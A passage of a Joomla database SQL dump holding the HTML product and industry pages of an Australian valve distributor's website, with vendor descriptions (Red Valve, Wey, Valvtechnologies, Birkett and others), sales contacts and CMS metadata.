4800</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Sales Western Australia/Northern Territory<br /></strong></p>\r\n<p>&nbsp;&nbsp;&nbsp; Hennie Pretorius +61 402 654 608</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Sales South Australia/Tasmania<br /></strong></p>\r\n<p>&nbsp;&nbsp;&nbsp; Gary Gordon +61 405 262 595</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Sales Victoria</strong></p>\r\n<p>&nbsp;&nbsp;&nbsp; Greg Jordan +61 438 601 556</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Sales Queensland</strong></p>\r\n<p>&nbsp;&nbsp;&nbsp; Ian Burgess +61 407 178 154</p>', '', 1, 8, '2013-04-17 02:54:45', 32, '', '2014-04-08 05:40:56', 32, 0, '0000-00-00 00:00:00', '2013-04-17 02:54:45', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 14, 13, '', '', 1, 5462, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(3, 39, 'Noreva', 'noreva', '<p>Noreva manufactures high end nozzle check valves. These nozzle check valves are used in applications where the reverse flow of a fluid has to be avoided. These valves are suitable for all kind of liquid and gaseous fluids and are fire safe by design.<br />The high economic efficiency of our nozzle check valves is a result of very low pressure losses and the maintenance-free design. Due to short strokes and low moving masses, the valves can close slam-free within fractions of seconds<br />Features:</p>\r\n<ul></ul>\r\n<table style="width: 650px; height: 310px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Non slam closure</li>\r\n</td>\r\n<td>\r\n<li>Low pressure loss</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Maintenance free design</li>\r\n</td>\r\n<td>\r\n<li>ASME Class 125 to 2500</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Carbon steel, stainless steel, low temperature carbon steel, nickel-aluminium-bronze, duplex, supper duplex.</li>\r\n</td>\r\n<td>\r\n<li>Standard version and compact version (shorter face to face) available</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Applications include – compressor stations, tank farm, desalination plant, water distribution multi-pump systems.</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><a target="_blank" href="http://www.noreva.de/english/content/01duesenrueckschlagventile/index.htm">View Website »</a></p>\r\n<p><a target="_blank" href="images/brochures/Noreva-Catalogue.pdf">View Brochure »</a></p>', '', 1, 8, '2013-05-01 01:58:51', 32, '', '2013-06-24 00:56:14', 32, 0, '0000-00-00 00:00:00', '2013-05-01 01:58:51', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 7, 12, '', '', 1, 2608, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(4, 41, 'RED VALVE', 'red-valve', '<h3>Providing Cost-Effective, Creative Valve Solutions</h3>\r\n<p>Red Valve Company is the world''s largest manufacturer of pinch valves and has an international reputation for quality-engineered valves designed for long life in the toughest municipal and industrial applications.</p>\r\n<p>Red Valve''s advanced elastomer technology is engineered into every Red Valve pinch valve, control valve, slurry knife gate valve, pressure sensor, Redflex© Expansion Joint and revolutionary all-rubber Tideflex© Check Valve. We''re dedicated to listening and responding to customer needs with innovative products and services.</p>\r\n<p>Solving your most demanding flow control applications - this has been the single driving force behind Red Valve since our founding in 1953. Today we remain dedicated to responding to your needs with valve products and engineering services that set the standard for the world''s toughest applications. Our initial order was for the world''s first coal slurry pipeline, where we created the only available valve capable of reliable slurry control.</p>\r\n<p><strong>Red Valve Manufactures:</strong></p>\r\n<ul></ul>\r\n<table style="width: 580px; height: 175px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Redflex Expansion Joints</li>\r\n</td>\r\n<td>\r\n<li>Pressure Sensors</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Knife Gate Valves</li>\r\n</td>\r\n<td>\r\n<li>Control Pinch Valves</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Manual Pinch Valves</li>\r\n</td>\r\n<td>\r\n<li>Air Operated Pinch Valves</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Pinch Valve Sleeves</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><a target="_blank" href="http://www.redvalve.com/rv/index.php">View Website »</a></p>', '', 1, 8, '2013-05-27 03:14:00', 32, '', '2013-06-24 00:55:14', 32, 0, '0000-00-00 00:00:00', '2013-05-27 03:14:00', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 9, 11, '', '', 1, 2562, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(5, 42, 'TIDEFLEX', 'tideflex', '<p>The Red Valve Company is the world''s leader in pinch valve technology. Twenty years ago Red Valve introduced the revolutionary "duckbill" Tideflex Check Valve. Since then, it has become the world standard for maintenance free backflow prevention.</p>\r\n<p>The design flexibility of the Tideflex Check Valve has led to innovative applications such as variable orifice nozzles for use in mixing and dispersion systems. This innovation led to the development of multi-port mixing systems and the formation of a separate design division within Red Valve Company called Tideflex Technologies.</p>\r\n<p>The Tideflex Technologies Division designs single check valve applications, diffused aeration and mixing systems, mixing systems for potable water storage tanks, high rate wastewater recirculation systems, and effluent diffuser outfall systems. The development of the Tideflex Mixing System (TMS) for mixing water storage tanks has led to a full line of NSF Certified products as well as the implementation of NSF certified clean room fabrication facilities located within our Gastonia, NC plant.</p>\r\n<p>The Tideflex Technologies Division has a staff of professional engineers and designers who have developed specialized hydrodynamic mixing models for use with the design of all Tideflex''s mixing systems. This staff is available to assist you with the design of those difficult applications and explain how the Tideflex product line can provide unique and cost effective solutions. You can contact Tideflex Technologies direct or utilise our extensive network of local sales representative companies.</p>\r\n<p><strong>Engineered Features:</strong></p>\r\n<ul></ul>\r\n<table style="width: 655px; height: 290px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Eccentric flat-bottom design</li>\r\n</td>\r\n<td>\r\n<li>No moving or mechanical parts</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>100% elastomer construction</li>\r\n</td>\r\n<td>\r\n<li>Curved Bill design enhances sealing</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Low headloss for low-lying areas</li>\r\n</td>\r\n<td>\r\n<li>Self-draining, eliminates standing water</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Custom-built to your flow specifications</li>\r\n</td>\r\n<td>\r\n<li>Silent, non-slamming</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Cost-effective, reliable replacement for traditional flapgates</li>\r\n</td>\r\n<td>\r\n<li>Sensitive enough to open with as little as 25mm of water pressure</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><img alt="tideflex1" src="images/tideflex/tideflex1.jpg" height="153" width="185" />&nbsp; <img alt="4" src="images/newimages/tideflex/4.jpg" height="154" width="300" /></p>\r\n<p><a target="_blank" href="http://www.tideflex.com/tf/index.php">View Website »</a></p>\r\n<p><a target="_blank" href="images/brochures/Tideflex_Condensed_Catalog.pdf">View Brochure »</a></p>', '', 1, 8, '2013-05-27 03:26:44', 32, '', '2013-06-24 00:54:11', 32, 0, '0000-00-00 00:00:00', '2013-05-27 03:26:44', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 9, 10, '', '', 1, 2852, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(6, 43, 'Wey', 'wey', '<p>WEY Valve offers several styles of High Performance Knife Gate valves to meet your needs. We will help you select the correct valve style for your application based on your process conditions and system needs. Standard materials of construction range from Cast Iron to Titanium. We offer designs for pressures up to 1440 psi CWP. Virtually all popular actuators and accessories are available.</p>\r\n<h3>Performance Based Design</h3>\r\n<p>WEY Valve is a recognized leader for High Performance Knife Gate valve products that provide the tightest bi-directional shut off in the industry. WEY Valve products are designed to outperform conventional style knife gate valves. Our valves solve jamming issues, prevent leakage downstream, and stop packing leakage problems. Our unique features and design concepts provide a level of performance previously thought unattainable from a knife gate valve. These features and design concepts are put into an extremely maintenance friendly package. Our products will reduce process down time through longer service life and quicker turn around when maintenance is required.</p>\r\n<h3>WEY Valve serves virtually all industries</h3>\r\n<p>WEY Valve has developed a comprehensive line of High Performance Knife Gate valves to service virtually all industries. Specializing in high solid slurries, fiber slurries, abrasive slurries, dry material handling, and corrosive media we solve tough application in a variety of industries. A large selection of products and a wide size range is available to cover practically all resilient seated Knife Gate valve applications. Whether you are looking for a Knife Gate valve for high density pulp stock, air conveyed fly ash, or an abrasive tailings line WEY Valve has the products and experience to meet your needs.</p>\r\n<h3>WEY delivers:</h3>\r\n<table id="listtablehere" style="width: 660px; height: 175px; background-color: #efefef;">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<ul>\r\n<li>Proven high performance design</li>\r\n</ul>\r\n</td>\r\n<td>\r\n<ul>\r\n<li>Bi-directional zero leakage</li>\r\n</ul>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<ul>\r\n<li>Low thrust requirements</li>\r\n</ul>\r\n</td>\r\n<td>\r\n<ul>\r\n<li>Corrosion &amp; erosion resistent materials</li>\r\n</ul>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<ul>\r\n<li>Hardened wear materials &amp; coatings</li>\r\n</ul>\r\n</td>\r\n<td>\r\n<ul>\r\n<li>Heavy duty universal bonnet</li>\r\n</ul>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<ul>\r\n<li>Transverse seal repackable in line under pressure</li>\r\n</ul>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><a href="http://www.weyvalve.com" target="_blank">View Website »</a></p>\r\n<p><a href="images/brochures/wey-high-performance-knife-gate-valves-for-web_mod_final_1.pdf" target="_blank">View Brochure »</a></p>', '', 1, 8, '2013-05-27 03:42:31', 32, '', '2014-08-08 07:11:40', 32, 0, '0000-00-00 00:00:00', '2013-05-27 03:42:31', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 11, 9, '', '', 1, 4503, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(7, 45, 'SOR', 'sor', '<p><em>Providing level, flow, temperature and pressure instrumentation products.</em></p>\r\n<p>The history of SOR Inc is founded on simple ideas that work. It all began in 1956 with the invention of the static-o-ring (SOR) pressure switch. Since the ring is static, there is no friction, and no wear and tear.<br />SOR is a global leader in the field of measurement and control. One big reason for the continued growth of SOR is our willingness to listen to our customers'' specific needs and develop solutions to meet those needs for the Oil and Gas, Power Generation and Nuclear industries. In fact many of the products we deliver are specially engineered to order.<br />SOR manufactures a wide variety of mechanical and electronic devices to measure pressure, level, temperature and flow – and we''re working constantly to improve our product platform.<br />All of our products are engineered and manufactured at SOR world headquarters located in Lenexa, Kansas. SOR also maintains branch offices in Beijing and London.</p>\r\n<p><strong>Pressure Switches</strong><br />Today''s SOR pressure switches are the descendants of the original Static "O" Ring mechanical switches that set industry standards more than 50 years ago. Our switches are field-proven, low cost process instruments for use as either primary or redundant pressure or flow monitoring applications in a wide variety of industries.</p>\r\n<p><strong>Pressure Transmitters</strong><br />"Set it and forget it" reliability makes SOR pressure transmitters perfect for applications when space is tight. Our stainless steel construction stands up to the rigors of hostile environments and hazardous locations. Available with either 4-20mA or 1-5 VDC outputs and with adjustable ranges for pressure transmitters<br /><strong></strong></p>\r\n<p><strong>Level Switches</strong><br />SOR level switches have earned a long-time reputation for their high quality, rugged construction and reliable performance under the most demanding applications. All level switches are individually built with strict attention to detail to meet the exact specifications of your process. Available as float level switches and displacer level switches, our product offering provides superior alarm and monitoring control for heavy industries such as power generation, refining, petrochemical and general manufacturing.<br /><strong></strong></p>\r\n<p><strong>Level Transmitters</strong><br />SOR level transmitters continuously sense the liquid level in tanks and deliver a 4-20 mA current proportional to the level. The current output can be connected to a programmable logic controller, computer, remote display or relay module to display and/or control the liquid level in the tank. Depending on the model you choose monitoring may be accomplished without contacting the process. Our transmitters may be used as a point or continuous level measurement device.<br /><strong></strong></p>\r\n<p><strong>Flow Switches</strong><br />SOR flow switches have proven to be workhorses in the process instrumentation industry. They are ruggedly built to exacting standards and provide long-lasting service.</p>\r\n<p>&nbsp;</p>\r\n<p><a target="_blank" href="http://www.sorinc.com">View Website »</a></p>', '', 1, 8, '2013-05-28 23:50:36', 32, '', '2013-06-13 06:47:46', 32, 0, '0000-00-00 00:00:00', '2013-05-28 23:50:36', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 3, 7, '', '', 1, 3239, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(8, 46, 'Valvtechnologies', 'valvtechnologies', '<h3>Zero Leakage = Long Term Reliability</h3>\r\n<p>Valvtechnologies is a global leader in the design and manufacturing of severe service valves and has established a worldwide reputation for superior quality and dependability with customers in every industry.<br />In the demanding process environments facing our customers, these standards are the foundation our customers look for. What they get, beyond this, is the recognised value of ValvTechnologies as proven, dependable partner.<br />Valvtechnologies sets the standard for zero leakage valve solutions.<br />Valvtechnologies'' valves are built to withstand the most severe applications, High temperature, high pressure, high cycling, abrasive, corrosive and caustic media have all been considered in the design of the product line.<br /><strong></strong></p>\r\n<p><strong>Power</strong><br />ValvTechnologies designs and manufactures valves specifically for the unique demands of power generation applications.<br />The standard operating conditions of power generation: high temperatures, high pressures and at times, high cycling, can severely impact the service life of a valve. Special consideration should be made in the selection of metallurgy, sealing design and operation. ValvTechnologies, a leading global manufacturer of metal-seated, severe service valves, has a proven performance record of providing field tested, ZERO Leakage solutions.<br />Key Features of the V1 series flagship metal seated ball valve are the integral metal seat, blow-out proof stem, live loaded gland area, patented coating process and body seal ring.<br /><strong></strong></p>\r\n<p><strong>Mining and Mineral Processing</strong><br />Mining and Minerals Processing is an area where critical valve failures can create expensive shut-downs.<br />At ValvTechnologies we understand the importance of reliability and more importantly Zero Leakage. Valve leakage inside a slurry line will soon lead to dewatering of the slurry and expensive retrofit work, with extensive operational down-time. Understanding the design and potential problems in the client''s process is the way we understand their unique needs ... and we plan and respond.<br />We have severe service valves that operate in process conditions that push the limits of engineering capabilities.<br /><strong></strong></p>\r\n<p><strong>Oil &amp; Gas / Upstream</strong><br />The ValvTechnologies design is a departure from traditional valves found in Oil &amp; Gas Production.<br />In the Oil &amp; Gas industry, valve performance can be compromised by combinations of process conditions such as high temperature, high pressure, high solids or high cycles. The ValvTechnologies design is quite unlike that found in floating and trunnion-style ball valves and is a complete departure from the traditional gate and plug valves found in this industry. The ValvTechnologies design uses an integral seat rather than loose seats.</p>\r\n<p>The integral seat provides a stable platform onto which the ball is constantly loaded with very high force, making it impossible to trap solids between the ball and seat. When the ball is in the open position, the seats are protected from the flow. The integral seat also eliminates the potential for leakage between a loose seat and the valve body.</p>\r\n<p>&nbsp;</p>\r\n<p><a target="_blank" href="http://www.valv.com">View Website »</a></p>\r\n<p><a target="_blank" href="images/brochures/Valvtechnologies_CorporateBroch.pdf">View Brochure - Corporate »</a></p>\r\n<p><a target="_blank" href="images/brochures/Valvtechnologies_PowerBroch.pdf">View Brochure - Power »</a></p>\r\n<p><a target="_blank" href="images/brochures/V1-Datasheet.pdf">View Brochure - V1 Datasheet »</a></p>', '', 1, 8, '2013-05-29 00:10:28', 32, '', '2013-06-24 00:53:23', 32, 0, '0000-00-00 00:00:00', '2013-05-29 00:10:28', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 5, 8, '', '', 1, 4046, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(9, 47, 'Birkett', 'safety-systems', '<h3>BIRKETT safety relief valves</h3>\r\n<p>A comprehensive range of high performance <a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett/safety-relief-valves/">pilot operated safety valves</a> and <a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett/safety-relief-valves/">spring loaded safety relief valves</a> to protect plant and equipment by relieving excess pressure.<br /><br />With over 100 years of experience, BIRKETT manufactures a full range of full nozzle, full lift safety relief valves, including spring loaded safety valves, pilot operated valves and thermal relief valves. BIRKETT valves offer effective pressure relief in gas, liquid, and steam applications to meet the safety demands of the offshore oil &amp; gas, processing, refining, chemical and petrochemical industries. The valves are also assembled and tested to suit the standards of cryogenic gas applications.<br />Renowned for flexibility in design, the BIRKETT range can be tailored to solve specific customer requirements with an extensive range of materials and accessories. All valves are fully compliant with API 520 (design) and 526 (dimensional) codes, and certified to full ASME "UV" standards.<br /><strong></strong></p>\r\n<p><strong>The BIRKETT range of safety relief valves includes:</strong></p>\r\n<ul>\r\n<li><a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett/safety-relief-valves/wb-series/">WB Series spring loaded safety relief valves</a>: full nozzle spring loaded safety relief valve with a full lift and full nozzle to safely relieve excess pressure in a variety of process vessels, including pumps, pipes, tanks, calorifiers, and gas and oil separators. The WB Series conforms to API526 pressure/temperature and dimensions.</li>\r\n<li><a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett/safety-relief-valves/safeflo/">Safeflo safety and thermal relief valves</a>: thermal relief valves for smaller gas or liquid applications, where they relieve thermal expansion of process fluids in vessels and long pipes.</li>\r\n<li><a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett/pilot-operated-relief-valves/safeset/">Safeset pilot operated safety relief valves</a>: self contained pilot operated safety relief valves that independently control valve opening and closing without the need for additional energy sources. Safeset valves have a unique full nozzle design and conform to API 526 pressure / temperature ranges and dimensions and are also available as pop and modulating pilots to suit both gas and liquid duties.</li>\r\n</ul>\r\n<p><a target="_blank" href="http://www.safetysystemsuk.com/brands/birkett">View website »</a></p>', '', 1, 8, '2013-05-30 02:26:08', 32, '', '2013-06-24 01:08:00', 32, 0, '0000-00-00 00:00:00', '2013-05-30 02:26:08', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 8, 6, '', '', 1, 2097, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(10, 48, 'Power', 'power', '<p>High temperature, high pressure are generally synonymous with severe service control and isolation applications.<br />It is in the power industry that Flotech Controls has provided more than 20 years of service in providing solutions to these difficult applications. Where the cost of fuel is by far the major cost in a plant that isn''t running efficiently, leaking isolation valves are a sure way to burn money.<br />In isolation applications, Valvtechnologies metal seated ball valves are proven leaders in providing a solution that provides zero leakage isolation.<br />When it comes to control valves and large pressure drops, selecting the correct trim to handle these conditions correctly comes from understanding your requirements and having the experience to correctly select the right product.<br />Our team has many years of experience in these difficult applications and are geared up to work with you in selecting the right valves.</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Applications</strong></p>\r\n<p>&nbsp;</p>\r\n<ul></ul>\r\n<table style="width: 580px; height: 175px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Above and below seat drains</li>\r\n</td>\r\n<td>\r\n<li>Ash Handling</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Attemporator Spray Control</li>\r\n</td>\r\n<td>\r\n<li>Turbine Bypass</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Boiler Drains</li>\r\n</td>\r\n<td>\r\n<li>Boiler Feed Pump Isolation</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Continuous Boiler Blowdown</li>\r\n</td>\r\n<td>\r\n<li>Feedwater Isolation</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Instrument Isolation</li>\r\n</td>\r\n<td>\r\n<li>Start-up Vents</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Steam Dumps</li>\r\n</td>\r\n<td>\r\n<li>Turbine Drains</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Drum level control</li>\r\n</td>\r\n<td>\r\n<li>Boiler Feed Pump Recirculation</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><br />&nbsp;</p>\r\n<p>Below are some of our products lines for power applications.</p>\r\n<ul>\r\n<li><a href="/products/valvtechnologies">Valvtechnologies</a></li>\r\n<li><a href="/products/copes">Copes - Vulcan</a></li>\r\n<li><a href="/products/birkett">Birkett</a></li>\r\n<li><a href="/products/wey">Wey</a></li>\r\n<li><a href="/products/red-valve">Red Valve</a></li>\r\n</ul>', '', 1, 8, '2013-06-06 03:22:12', 32, '', '2013-06-24 01:27:18', 32, 0, '0000-00-00 00:00:00', '2013-06-06 03:22:12', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 22, 5, '', '', 1, 1987, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(11, 49, 'Mining', 'mining', '<p>Slurries in mining applications can be very abrasive and corrosive depending on the process conditions. From an abrasive magnetite process plant through to the corrosive nature of the beneficiation of metals like nickel, valve selection is key in providing the right solution. Minimising maintenance and striving towards trouble-free operation at the lowest total cost of ownership would be front of mind for any operator.</p>\r\n<p>Flotech Controls focusses delivers products that are specifically geared to the rugged conditions of these applications. Zero leakage, excellent performance to minimise down time and lowest cost of ownership are key criteria in selecting valves.</p>\r\n<p>From high pressure product lines, tailing disposal systems, high pressure acid leaching and many applications through the process plant, valves from Flotech Controls have been carefully selected to deliver the right solution for the application.</p>\r\n<p><strong>Applications</strong></p>\r\n<ul></ul>\r\n<table style="width: 580px; height: 175px; background-color: #efefef;" id="listtablehere">\r\n<tbody>\r\n<tr>\r\n<td>\r\n<li>Slurry Transfer</li>\r\n</td>\r\n<td>\r\n<li>Tailings disposal</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Thickener underflow</li>\r\n</td>\r\n<td>\r\n<li>Fly ash</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>High pressure acid leaching</li>\r\n</td>\r\n<td>\r\n<li>Cyclone feed</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Pump suction and discharge isolation</li>\r\n</td>\r\n<td>\r\n<li>Autoclave acid injection</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Floatation Cells</li>\r\n</td>\r\n<td>\r\n<li>Lime Feed</li>\r\n</td>\r\n</tr>\r\n<tr>\r\n<td>\r\n<li>Concentrators</li>\r\n</td>\r\n<td>\r\n<li>Mine dewatering</li>\r\n</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>&nbsp;</p>\r\n<p>Below are some of our products lines for mining applications. Flotech Controls is focussed on the right valve selection for the application. We understand mining process conditions, we focus on solutions that work delivering less down-time and lowest cost of ownership.</p>\r\n<ul>\r\n<li><a href="/products/valvtechnologies">Valvtechnologies</a></li>\r\n<li><a href="/products/wey">Wey</a></li>\r\n<li><a href="/products/red-valve">Red Valve</a></li>\r\n<li><a href="/products/noreva">Noreva</a></li>\r\n</ul>\r\n<p>&nbsp;</p>', '', 1, 8, '2013-06-07 02:27:01', 32, '', '2013-06-14 02:08:17', 32, 0, '0000-00-00 00:00:00', '2013-06-07 02:27:01', '0000-00-00 00:00:00', 